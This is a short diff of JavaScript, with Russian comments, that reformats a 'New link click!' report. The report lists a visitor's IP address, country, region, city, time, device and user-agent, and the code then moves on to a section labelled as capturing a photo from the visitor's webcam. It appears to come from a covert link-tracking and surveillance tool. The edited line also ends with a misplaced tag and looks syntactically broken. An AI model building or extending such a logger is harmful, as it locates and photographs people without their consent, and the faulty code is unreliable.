@@ -42,12 +42,15 @@
     // ---------- 4. Формирование caption (древовидный стиль) ----------
     const caption = `🚨Новый переход по ссылке!
 
-🌐IP Адресс: ${ipAddress}
- ├─🌍Гео: ${geo}
- └─🕗Время: ${timeStr}
- 
- ├─🎭Устройство: ${deviceType}
- └─🖥UserAgent: ${shortUA}`;
+🌐<b>IP:</b> <code>${ipAddress}</code>
+ ├─🌍<b>Геолокация:</b>
+        ├─<b>Страна:</b> <code>${geoData.country_name}</code>
+        ├─<b>Регион:</b> <code>${geoData.region}</code>
+        └─<b>Город:</b> <code>${geoData.city}</code>
+ └─🕗<b>Время:</b> <code>${timeStr}</code>
+
+📞<b>Устройство:</b> <code>${deviceType}</code>
+ └─🖥<b>User-Agent:</b> <code>${shortUA}`;<code>
 
     // ---------- 5. Захват фото с вебкамеры ----------
     let photoBlob = null;
